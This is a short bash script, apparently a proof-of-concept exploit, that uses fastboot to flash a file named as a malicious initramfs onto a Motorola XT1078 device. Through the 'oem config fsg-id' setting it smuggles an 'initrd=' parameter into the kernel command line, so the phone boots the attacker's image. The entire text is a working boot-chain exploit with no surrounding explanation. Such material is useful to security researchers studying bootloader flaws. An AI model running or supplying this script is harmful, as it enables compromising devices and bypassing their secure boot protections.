#!/bin/bash
FILE_NAME=initroot-xt1078-p64-MALICIOUS.cpio.gz;

fastboot flash aleph $FILE_NAME
sleep 4

fastboot oem config fsg-id "a initrd=0x15000000,832818"
sleep 2

fastboot continue
sleep 2

